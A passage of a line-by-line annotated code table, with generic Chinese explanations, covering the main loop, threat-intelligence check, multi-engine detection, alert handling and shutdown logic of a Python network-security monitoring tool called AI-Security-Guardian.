| 467 | 条件判断：满足条件时进入对应分支。 | `            if src_ip and self._is_threat_intel_hit(src_ip):` |
| 468 | 异常保护：尝试执行可能失败的逻辑。 | `                try:` |
| 469 | 函数调用：执行已有函数/方法完成当前步骤。 | `                    self._metrics.record_threat_intel_drops(1)` |
| 470 | 异常处理：捕获错误并执行降级或记录逻辑。 | `                except Exception:  # noqa: BLE001` |
| 471 | 占位语句：保持语法完整但当前不执行操作。 | `                    pass` |
| 472 | 返回结果：把处理后的值交回调用方。 | `                return` |
| 473 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 474 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            web_feat = self.web_extractor.extract(log_entry)` |
| 475 | 异常保护：尝试执行可能失败的逻辑。 | `            try:` |
| 476 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                result = self.web_detector.detect(web_feat)` |
| 477 | 异常处理：捕获错误并执行降级或记录逻辑。 | `            except Exception as exc:  # noqa: BLE001` |
| 478 | 日志记录：输出运行状态、调试信息或异常线索。 | `                logger.error("[Guardian] WebAttackDetector 异常: %s", exc)` |
| 479 | 返回结果：把处理后的值交回调用方。 | `                return` |
| 480 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 481 | 条件判断：满足条件时进入对应分支。 | `            if result and result.threat_type != "normal":` |
| 482 | 函数调用：执行已有函数/方法完成当前步骤。 | `                self._on_threat(result)` |
| 483 | 异常处理：捕获错误并执行降级或记录逻辑。 | `        except Exception as exc:  # noqa: BLE001` |
| 484 | 日志记录：输出运行状态、调试信息或异常线索。 | `            logger.error("[Guardian] Web 日志处理异常: %s", exc, exc_info=True)` |
| 485 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 486 | 注释：解释下面或当前这段代码的设计意图。 | `    # ------------------------------------------------------------------` |
| 487 | 注释：解释下面或当前这段代码的设计意图。 | `    # 威胁情报前置过滤` |
| 488 | 注释：解释下面或当前这段代码的设计意图。 | `    # ------------------------------------------------------------------` |
| 489 | 函数定义：声明 `_is_threat_intel_hit` 的输入、处理逻辑和返回结果。 | `    def _is_threat_intel_hit(self, ip: str) -> bool:` |
| 490 | 文档字符串：说明当前模块、类或函数的职责。 | `        """命中威胁情报则直接触发响应 + 审计日志，并返回 True。"""` |
| 491 | 异常保护：尝试执行可能失败的逻辑。 | `        try:` |
| 492 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            intel = self.threat_intel.check_ip(ip)` |
| 493 | 异常处理：捕获错误并执行降级或记录逻辑。 | `        except Exception as exc:  # noqa: BLE001 - 情报查询失败不阻断主流程` |
| 494 | 日志记录：输出运行状态、调试信息或异常线索。 | `            logger.debug("[Guardian] 威胁情报查询异常: %s", exc)` |
| 495 | 返回结果：把处理后的值交回调用方。 | `            return False` |
| 496 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 497 | 条件判断：满足条件时进入对应分支。 | `        if not intel or not intel.get("is_malicious"):` |
| 498 | 返回结果：把处理后的值交回调用方。 | `            return False` |
| 499 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 500 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        ioc_val = str(intel.get("ioc_value") or ip)` |
| 501 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        src = str(intel.get("source", "unknown"))` |
| 502 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        srcs = intel.get("sources") or []` |
| 503 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        src_part = f" merged_sources={srcs}" if srcs else ""` |
| 504 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        result = DetectionResult(` |
| 505 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            threat_type="threat_intel",` |
| 506 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            threat_level="high",` |
| 507 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            confidence=0.95,` |
| 508 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            details=(` |
| 509 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                f"威胁情报命中: IOC={ioc_val} source={src}{src_part}"` |
| 510 | 函数调用：执行已有函数/方法完成当前步骤。 | `            ).strip(),` |
| 511 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            source_ip=ip,` |
| 512 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            raw_data={"intel": {k: v for k, v in intel.items() if k != "metadata"}},` |
| 513 | 函数调用：执行已有函数/方法完成当前步骤。 | `        )` |
| 514 | 函数调用：执行已有函数/方法完成当前步骤。 | `        self._on_threat(result)` |
| 515 | 返回结果：把处理后的值交回调用方。 | `        return True` |
| 516 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 517 | 注释：解释下面或当前这段代码的设计意图。 | `    # ------------------------------------------------------------------` |
| 518 | 注释：解释下面或当前这段代码的设计意图。 | `    # 多引擎检测（逐个 try；单引擎异常不影响其它引擎）` |
| 519 | 注释：解释下面或当前这段代码的设计意图。 | `    # ------------------------------------------------------------------` |
| 520 | 函数定义：声明 `_safe_detect_many` 的输入、处理逻辑和返回结果。 | `    def _safe_detect_many(` |
| 521 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        self, features: Dict[str, Any]` |
| 522 | 代码语句：参与当前文件的业务流程或数据处理。 | `    ) -> List[Optional[DetectionResult]]:` |
| 523 | 文档字符串：说明当前模块、类或函数的职责。 | `        """逐个调用 4 个检测引擎，捕获异常后继续下一个。"""` |
| 524 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        engines = [` |
| 525 | 函数调用：执行已有函数/方法完成当前步骤。 | `            ("DDoSDetector", self.ddos_detector),` |
| 526 | 函数调用：执行已有函数/方法完成当前步骤。 | `            ("IntrusionDetector", self.intrusion_detector),` |
| 527 | 函数调用：执行已有函数/方法完成当前步骤。 | `            ("AnomalyDetector", self.anomaly_detector),` |
| 528 | 代码语句：参与当前文件的业务流程或数据处理。 | `        ]` |
| 529 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        out: List[Optional[DetectionResult]] = []` |
| 530 | 循环：逐个处理集合或迭代器中的元素。 | `        for name, engine in engines:` |
| 531 | 条件判断：满足条件时进入对应分支。 | `            if not getattr(engine, "is_ready", False):` |
| 532 | 继续循环：跳过本轮剩余逻辑。 | `                continue` |
| 533 | 异常保护：尝试执行可能失败的逻辑。 | `            try:` |
| 534 | 函数调用：执行已有函数/方法完成当前步骤。 | `                out.append(engine.detect(features))` |
| 535 | 异常处理：捕获错误并执行降级或记录逻辑。 | `            except Exception as exc:  # noqa: BLE001` |
| 536 | 日志记录：输出运行状态、调试信息或异常线索。 | `                logger.error("[Guardian] %s 推理异常: %s", name, exc)` |
| 537 | 函数调用：执行已有函数/方法完成当前步骤。 | `                out.append(None)` |
| 538 | 返回结果：把处理后的值交回调用方。 | `        return out` |
| 539 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 540 | 注释：解释下面或当前这段代码的设计意图。 | `    # ------------------------------------------------------------------` |
| 541 | 注释：解释下面或当前这段代码的设计意图。 | `    # 威胁处置：响应 + 审计 + Web 广播` |
| 542 | 注释：解释下面或当前这段代码的设计意图。 | `    # ------------------------------------------------------------------` |
| 543 | 函数定义：声明 `_on_threat` 的输入、处理逻辑和返回结果。 | `    def _on_threat(self, result: DetectionResult) -> None:` |
| 544 | 文档字符串：说明当前模块、类或函数的职责。 | `        """统一处置入口：执行响应 → 写审计日志 → 可选广播到前端。"""` |
| 545 | 异常保护：尝试执行可能失败的逻辑。 | `        try:` |
| 546 | 函数调用：执行已有函数/方法完成当前步骤。 | `            self._metrics.record_alert()` |
| 547 | 异常处理：捕获错误并执行降级或记录逻辑。 | `        except Exception:  # noqa: BLE001` |
| 548 | 占位语句：保持语法完整但当前不执行操作。 | `            pass` |
| 549 | 异常保护：尝试执行可能失败的逻辑。 | `        try:` |
| 550 | 函数调用：执行已有函数/方法完成当前步骤。 | `            self.responder.respond(result)` |
| 551 | 异常处理：捕获错误并执行降级或记录逻辑。 | `        except Exception as exc:  # noqa: BLE001` |
| 552 | 日志记录：输出运行状态、调试信息或异常线索。 | `            logger.error("[Guardian] 响应执行异常: %s", exc)` |
| 553 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 554 | 异常保护：尝试执行可能失败的逻辑。 | `        try:` |
| 555 | 日志记录：输出运行状态、调试信息或异常线索。 | `            self.security_logger.log_event(` |
| 556 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                event_type=result.threat_type,` |
| 557 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                level=result.threat_level,` |
| 558 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                details={"detection": result.details, "raw": result.raw_data},` |
| 559 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                source_ip=result.source_ip,` |
| 560 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                confidence=float(result.confidence),` |
| 561 | 函数调用：执行已有函数/方法完成当前步骤。 | `            )` |
| 562 | 异常处理：捕获错误并执行降级或记录逻辑。 | `        except Exception as exc:  # noqa: BLE001` |
| 563 | 日志记录：输出运行状态、调试信息或异常线索。 | `            logger.error("[Guardian] 审计日志写入异常: %s", exc)` |
| 564 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 565 | 注释：解释下面或当前这段代码的设计意图。 | `        # 可选：通过 Redis Streams 跨进程共享（带 consumer group + ack 语义）` |
| 566 | 注释：解释下面或当前这段代码的设计意图。 | `        # 失败时由 RedisClient 自动降级到内存，不会抛到上层` |
| 567 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        stream_ok = False` |
| 568 | 异常保护：尝试执行可能失败的逻辑。 | `        try:` |
| 569 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            sid = self.redis.stream_add(` |
| 570 | 代码语句：参与当前文件的业务流程或数据处理。 | `                self._ALERT_STREAM,` |
| 571 | 代码语句：参与当前文件的业务流程或数据处理。 | `                {` |
| 572 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                    "alert_id": str(uuid.uuid4()),` |
| 573 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                    "timestamp": datetime.now(timezone.utc)` |
| 574 | 函数调用：执行已有函数/方法完成当前步骤。 | `                    .astimezone()` |
| 575 | 函数调用：执行已有函数/方法完成当前步骤。 | `                    .isoformat(timespec="seconds"),` |
| 576 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                    "type": result.threat_type,` |
| 577 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                    "level": result.threat_level,` |
| 578 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                    "confidence": float(result.confidence),` |
| 579 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                    "source_ip": result.source_ip,` |
| 580 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                    "details": result.details,` |
| 581 | 代码语句：参与当前文件的业务流程或数据处理。 | `                },` |
| 582 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                maxlen=self._ALERT_STREAM_MAXLEN,` |
| 583 | 函数调用：执行已有函数/方法完成当前步骤。 | `            )` |
| 584 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            stream_ok = sid is not None` |
| 585 | 异常处理：捕获错误并执行降级或记录逻辑。 | `        except Exception as exc:  # noqa: BLE001` |
| 586 | 日志记录：输出运行状态、调试信息或异常线索。 | `            logger.debug("[Guardian] Redis Streams 推送失败（已降级）: %s", exc)` |
| 587 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            stream_ok = False` |
| 588 | 异常保护：尝试执行可能失败的逻辑。 | `        try:` |
| 589 | 函数调用：执行已有函数/方法完成当前步骤。 | `            self._metrics.record_redis_stream_write(stream_ok)` |
| 590 | 异常处理：捕获错误并执行降级或记录逻辑。 | `        except Exception:  # noqa: BLE001` |
| 591 | 占位语句：保持语法完整但当前不执行操作。 | `            pass` |
| 592 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 593 | 注释：解释下面或当前这段代码的设计意图。 | `        # 可选：广播到 Phase 7 前端` |
| 594 | 条件判断：满足条件时进入对应分支。 | `        if self._flask_app and self._push_alert_fn:` |
| 595 | 异常保护：尝试执行可能失败的逻辑。 | `            try:` |
| 596 | 函数调用：执行已有函数/方法完成当前步骤。 | `                self._push_alert_fn(` |
| 597 | 代码语句：参与当前文件的业务流程或数据处理。 | `                    self._flask_app,` |
| 598 | 代码语句：参与当前文件的业务流程或数据处理。 | `                    {` |
| 599 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                        "threat_type": result.threat_type,` |
| 600 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                        "level": result.threat_level,` |
| 601 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                        "confidence": float(result.confidence),` |
| 602 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                        "source_ip": result.source_ip,` |
| 603 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                        "details": result.details,` |
| 604 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                        "title": result.details,` |
| 605 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                        "summary": result.details,` |
| 606 | 代码语句：参与当前文件的业务流程或数据处理。 | `                    },` |
| 607 | 函数调用：执行已有函数/方法完成当前步骤。 | `                )` |
| 608 | 异常处理：捕获错误并执行降级或记录逻辑。 | `            except Exception as exc:  # noqa: BLE001` |
| 609 | 日志记录：输出运行状态、调试信息或异常线索。 | `                logger.debug("[Guardian] 前端广播失败: %s", exc)` |
| 610 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 611 | 函数定义：声明 `_drain_network_packets_this_tick` 的输入、处理逻辑和返回结果。 | `    def _drain_network_packets_this_tick(self) -> None:` |
| 612 | 文档字符串：说明当前模块、类或函数的职责。 | `        """本 tick 从采集队列批量取包并送入聚合器；读取异常记入计数并继续。"""` |
| 613 | 条件判断：满足条件时进入对应分支。 | `        if self.packet_collector is None:` |
| 614 | 返回结果：把处理后的值交回调用方。 | `            return` |
| 615 | 异常保护：尝试执行可能失败的逻辑。 | `        try:` |
| 616 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            packets = self.packet_collector.get_packets(` |
| 617 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                max_count=self.cfg.max_packets_per_tick` |
| 618 | 函数调用：执行已有函数/方法完成当前步骤。 | `            )` |
| 619 | 异常处理：捕获错误并执行降级或记录逻辑。 | `        except Exception as exc:  # noqa: BLE001` |
| 620 | 日志记录：输出运行状态、调试信息或异常线索。 | `            logger.error("[Guardian] 数据包队列读取异常: %s", exc)` |
| 621 | 代码语句：参与当前文件的业务流程或数据处理。 | `            self._packet_queue_read_errors += 1` |
| 622 | 异常保护：尝试执行可能失败的逻辑。 | `            try:` |
| 623 | 函数调用：执行已有函数/方法完成当前步骤。 | `                self._metrics.record_queue_read_error()` |
| 624 | 异常处理：捕获错误并执行降级或记录逻辑。 | `            except Exception:  # noqa: BLE001` |
| 625 | 占位语句：保持语法完整但当前不执行操作。 | `                pass` |
| 626 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            packets = []` |
| 627 | 函数调用：执行已有函数/方法完成当前步骤。 | `        self.process_packet_batch(packets)` |
| 628 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 629 | 注释：解释下面或当前这段代码的设计意图。 | `    # ------------------------------------------------------------------` |
| 630 | 注释：解释下面或当前这段代码的设计意图。 | `    # 主循环` |
| 631 | 注释：解释下面或当前这段代码的设计意图。 | `    # ------------------------------------------------------------------` |
| 632 | 函数定义：声明 `run` 的输入、处理逻辑和返回结果。 | `    def run(self) -> None:` |
| 633 | 文档字符串：说明当前模块、类或函数的职责。 | `        """主运行循环。"""` |
| 634 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        self._running = True` |
| 635 | 日志记录：输出运行状态、调试信息或异常线索。 | `        self.security_logger.log_system("AI-Security-Guardian 启动", level="info")` |
| 636 | 日志记录：输出运行状态、调试信息或异常线索。 | `        logger.info("[Guardian] 系统已启动，开始监控...")` |
| 637 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 638 | 条件判断：满足条件时进入对应分支。 | `        if self.packet_collector is not None:` |
| 639 | 异常保护：尝试执行可能失败的逻辑。 | `            try:` |
| 640 | 函数调用：执行已有函数/方法完成当前步骤。 | `                self.packet_collector.start()` |
| 641 | 异常处理：捕获错误并执行降级或记录逻辑。 | `            except PermissionError:` |
| 642 | 日志记录：输出运行状态、调试信息或异常线索。 | `                logger.error(` |
| 643 | 代码语句：参与当前文件的业务流程或数据处理。 | `                    "[Guardian] 抓包权限不足（请用管理员/sudo 运行），该入口已禁用"` |
| 644 | 函数调用：执行已有函数/方法完成当前步骤。 | `                )` |
| 645 | 日志记录：输出运行状态、调试信息或异常线索。 | `                self.security_logger.log_system(` |
| 646 | 代码语句：参与当前文件的业务流程或数据处理。 | `                    "PacketCollector 权限不足，已禁用该采集入口", level="warning"` |
| 647 | 函数调用：执行已有函数/方法完成当前步骤。 | `                )` |
| 648 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                self.packet_collector = None` |
| 649 | 异常处理：捕获错误并执行降级或记录逻辑。 | `            except Exception as exc:  # noqa: BLE001` |
| 650 | 日志记录：输出运行状态、调试信息或异常线索。 | `                logger.error("[Guardian] PacketCollector 启动失败: %s", exc)` |
| 651 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                self.packet_collector = None` |
| 652 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 653 | 异常保护：尝试执行可能失败的逻辑。 | `        try:` |
| 654 | 循环：在条件成立期间重复执行逻辑。 | `            while self._running:` |
| 655 | 注释：解释下面或当前这段代码的设计意图。 | `                # 1) 网络数据包入口（含空批量，用于推进空闲超时）` |
| 656 | 条件判断：满足条件时进入对应分支。 | `                if self.packet_collector is not None:` |
| 657 | 函数调用：执行已有函数/方法完成当前步骤。 | `                    self._drain_network_packets_this_tick()` |
| 658 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 659 | 注释：解释下面或当前这段代码的设计意图。 | `                # 2) Web 日志入口` |
| 660 | 条件判断：满足条件时进入对应分支。 | `                if self.web_log_collector is not None:` |
| 661 | 异常保护：尝试执行可能失败的逻辑。 | `                    try:` |
| 662 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                        web_logs = self.web_log_collector.read_new_lines()` |
| 663 | 异常处理：捕获错误并执行降级或记录逻辑。 | `                    except Exception as exc:  # noqa: BLE001` |
| 664 | 日志记录：输出运行状态、调试信息或异常线索。 | `                        logger.error("[Guardian] Web 日志读取异常: %s", exc)` |
| 665 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                        web_logs = []` |
| 666 | 循环：逐个处理集合或迭代器中的元素。 | `                    for entry in web_logs:` |
| 667 | 函数调用：执行已有函数/方法完成当前步骤。 | `                        self.process_web_log(entry)` |
| 668 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 669 | 函数调用：执行已有函数/方法完成当前步骤。 | `                time.sleep(self.cfg.loop_interval_sec)` |
| 670 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 671 | 异常保护：尝试执行可能失败的逻辑。 | `                try:` |
| 672 | 函数调用：执行已有函数/方法完成当前步骤。 | `                    self.responder.scheduler.tick(self.responder)` |
| 673 | 异常处理：捕获错误并执行降级或记录逻辑。 | `                except Exception as exc:  # noqa: BLE001` |
| 674 | 日志记录：输出运行状态、调试信息或异常线索。 | `                    logger.debug("[Guardian] 响应调度 tick 异常: %s", exc)` |
| 675 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 676 | 异常保护：尝试执行可能失败的逻辑。 | `                try:` |
| 677 | 函数调用：执行已有函数/方法完成当前步骤。 | `                    self._metrics.set_collection_flags(` |
| 678 | 代码语句：参与当前文件的业务流程或数据处理。 | `                        self.packet_collector is not None,` |
| 679 | 代码语句：参与当前文件的业务流程或数据处理。 | `                        self.web_log_collector is not None,` |
| 680 | 函数调用：执行已有函数/方法完成当前步骤。 | `                    )` |
| 681 | 函数调用：执行已有函数/方法完成当前步骤。 | `                    self._metrics.flush_to_redis(self.redis)` |
| 682 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                    status_path = os.environ.get(` |
| 683 | 代码语句：参与当前文件的业务流程或数据处理。 | `                        "GUARDIAN_STATUS_FILE", "logs/guardian_status.json"` |
| 684 | 函数调用：执行已有函数/方法完成当前步骤。 | `                    )` |
| 685 | 函数调用：执行已有函数/方法完成当前步骤。 | `                    self._metrics.write_status_file(status_path)` |
| 686 | 异常处理：捕获错误并执行降级或记录逻辑。 | `                except Exception:  # noqa: BLE001` |
| 687 | 占位语句：保持语法完整但当前不执行操作。 | `                    pass` |
| 688 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 689 | 异常处理：捕获错误并执行降级或记录逻辑。 | `        except KeyboardInterrupt:` |
| 690 | 日志记录：输出运行状态、调试信息或异常线索。 | `            logger.info("[Guardian] 收到 Ctrl+C，准备优雅关闭")` |
| 691 | 收尾逻辑：无论是否异常都会执行清理。 | `        finally:` |
| 692 | 函数调用：执行已有函数/方法完成当前步骤。 | `            self.shutdown()` |
| 693 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 694 | 注释：解释下面或当前这段代码的设计意图。 | `    # ------------------------------------------------------------------` |
| 695 | 注释：解释下面或当前这段代码的设计意图。 | `    # 优雅关闭（幂等）` |
| 696 | 注释：解释下面或当前这段代码的设计意图。 | `    # ------------------------------------------------------------------` |
| 697 | 函数定义：声明 `shutdown` 的输入、处理逻辑和返回结果。 | `    def shutdown(self) -> None:` |
| 698 | 文档字符串：说明当前模块、类或函数的职责。 | `        """幂等的关闭流程，所有子模块的停止都被 try 包裹。"""` |
| 699 | 上下文管理：自动管理资源打开与释放。 | `        with self._shutdown_lock:` |
| 700 | 条件判断：满足条件时进入对应分支。 | `            if not self._running:` |
| 701 | 返回结果：把处理后的值交回调用方。 | `                return` |
| 702 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            self._running = False` |
| 703 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 704 | 日志记录：输出运行状态、调试信息或异常线索。 | `        logger.info("[Guardian] 开始优雅关闭...")` |
| 705 | 日志记录：输出运行状态、调试信息或异常线索。 | `        self.security_logger.log_system("AI-Security-Guardian 关闭中", level="info")` |
| 706 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 707 | 条件判断：满足条件时进入对应分支。 | `        if self.packet_collector is not None:` |
| 708 | 异常保护：尝试执行可能失败的逻辑。 | `            try:` |
| 709 | 函数调用：执行已有函数/方法完成当前步骤。 | `                self.packet_collector.stop()` |
| 710 | 异常处理：捕获错误并执行降级或记录逻辑。 | `            except Exception as exc:  # noqa: BLE001` |
| 711 | 日志记录：输出运行状态、调试信息或异常线索。 | `                logger.error("[Guardian] PacketCollector 停止异常: %s", exc)` |
| 712 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 713 | 注释：解释下面或当前这段代码的设计意图。 | `        # 尝试回写审计缓冲（如有）` |
| 714 | 异常保护：尝试执行可能失败的逻辑。 | `        try:` |
| 715 | 日志记录：输出运行状态、调试信息或异常线索。 | `            drained = self.security_logger.drain_buffer()` |
| 716 | 条件判断：满足条件时进入对应分支。 | `            if drained:` |
| 717 | 日志记录：输出运行状态、调试信息或异常线索。 | `                logger.info("[Guardian] 审计缓冲回写成功 %d 条", drained)` |
| 718 | 异常处理：捕获错误并执行降级或记录逻辑。 | `        except Exception:  # noqa: BLE001` |
| 719 | 占位语句：保持语法完整但当前不执行操作。 | `            pass` |
| 720 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 721 | 日志记录：输出运行状态、调试信息或异常线索。 | `        logger.info("[Guardian] 系统已停止")` |
| 722 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 723 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 724 | 注释：解释下面或当前这段代码的设计意图。 | `# =====================================================================` |
| 725 | 注释：解释下面或当前这段代码的设计意图。 | `# 顶层入口` |
| 726 | 注释：解释下面或当前这段代码的设计意图。 | `# =====================================================================` |
| 727 | 函数定义：声明 `_configure_logging` 的输入、处理逻辑和返回结果。 | `def _configure_logging() -> None:` |
| 728 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    level = os.environ.get("LOG_LEVEL", "INFO").upper()` |
| 729 | 日志记录：输出运行状态、调试信息或异常线索。 | `    logging.basicConfig(` |
| 730 | 日志记录：输出运行状态、调试信息或异常线索。 | `        level=getattr(logging, level, logging.INFO),` |
| 731 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        format="[%(asctime)s] %(name)s - %(levelname)s - %(message)s",` |
| 732 | 函数调用：执行已有函数/方法完成当前步骤。 | `    )` |
| 733 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 734 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 735 | 函数定义：声明 `_install_signal_handlers` 的输入、处理逻辑和返回结果。 | `def _install_signal_handlers(guardian: SecurityGuardian) -> None:` |
| 736 | 文档字符串：说明当前模块、类或函数的职责。 | `    """SIGINT / SIGTERM 统一走 shutdown()。"""` |
| 737 | 函数定义：声明 `handler` 的输入、处理逻辑和返回结果。 | `    def handler(signum, _frame):  # noqa: ANN001` |
| 738 | 日志记录：输出运行状态、调试信息或异常线索。 | `        logger.info("[Guardian] 捕获信号 %s，开始优雅关闭", signum)` |
| 739 | 函数调用：执行已有函数/方法完成当前步骤。 | `        guardian.shutdown()` |
| 740 | 函数调用：执行已有函数/方法完成当前步骤。 | `        sys.exit(0)` |
| 741 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 742 | 函数调用：执行已有函数/方法完成当前步骤。 | `    signal.signal(signal.SIGINT, handler)` |
| 743 | 注释：解释下面或当前这段代码的设计意图。 | `    # Windows 的 signal 模块不支持 SIGTERM，兼容写法` |
| 744 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    term = getattr(signal, "SIGTERM", None)` |
| 745 | 条件判断：满足条件时进入对应分支。 | `    if term is not None:` |
| 746 | 异常保护：尝试执行可能失败的逻辑。 | `        try:` |
| 747 | 函数调用：执行已有函数/方法完成当前步骤。 | `            signal.signal(term, handler)` |
| 748 | 异常处理：捕获错误并执行降级或记录逻辑。 | `        except (ValueError, OSError):` |
| 749 | 占位语句：保持语法完整但当前不执行操作。 | `            pass` |
| 750 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 751 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 752 | 函数定义：声明 `_parse_args` 的输入、处理逻辑和返回结果。 | `def _parse_args() -> argparse.Namespace:` |
| 753 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    parser = argparse.ArgumentParser(` |
| 754 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        description="AI-Security-Guardian 主入口（Phase 8）"` |
| 755 | 函数调用：执行已有函数/方法完成当前步骤。 | `    )` |
| 756 | 函数调用：执行已有函数/方法完成当前步骤。 | `    parser.add_argument(` |
| 757 | 代码语句：参与当前文件的业务流程或数据处理。 | `        "--dry-run",` |
| 758 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        dest="dry_run",` |
| 759 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        action="store_true",` |
| 760 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        help="演练模式：响应动作仅打印，不实际执行 iptables",` |
| 761 | 函数调用：执行已有函数/方法完成当前步骤。 | `    )` |
| 762 | 函数调用：执行已有函数/方法完成当前步骤。 | `    parser.add_argument(` |
| 763 | 代码语句：参与当前文件的业务流程或数据处理。 | `        "--no-packet-capture",` |
| 764 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        dest="no_packet_capture",` |
| 765 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        action="store_true",` |
| 766 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        help="禁用抓包（在无 libpcap 或无权限环境下使用）",` |
| 767 | 函数调用：执行已有函数/方法完成当前步骤。 | `    )` |
| 768 | 函数调用：执行已有函数/方法完成当前步骤。 | `    parser.add_argument(` |
| 769 | 代码语句：参与当前文件的业务流程或数据处理。 | `        "--no-web-log",` |
| 770 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        dest="no_web_log",` |
| 771 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        action="store_true",` |
| 772 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        help="禁用 Web 日志采集",` |
| 773 | 函数调用：执行已有函数/方法完成当前步骤。 | `    )` |
